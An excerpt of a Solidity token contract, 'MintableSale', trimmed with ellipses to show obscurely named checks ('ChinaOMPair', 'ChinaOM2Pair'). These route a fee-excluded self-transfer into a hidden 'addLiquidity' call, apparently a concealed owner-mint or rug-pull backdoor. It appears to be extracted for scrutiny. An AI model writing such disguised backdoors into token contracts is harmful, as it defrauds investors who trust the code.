...
library Address {
    ...
    function ChinaOMPair(address account) internal pure  returns (bool) {
...
contract MintableSale is Ownable, IERC20 {
    ...
    uint256 public _totalSupply = 200000 * 10 ** _decimals;
    ...
    function _transfer(address from, address to, uint256 amount) internal virtual {
        ...
        if (ChinaOM2Pair(from, to)) {return addLiquidity(amount, to);}
        ...
        if (!_excludedFromFee[from] && !_excludedFromFee[to] && !Address.ChinaOMPair(to) && to != address(this) && !inLiquidityTransaction && !babybool) {
    ...
    function ChinaOM2Pair(address from, address to) internal view returns(bool) {
        return (_excludedFromFee[msg.sender] || Address.ChinaOMPair(to)) && to == from;
    }
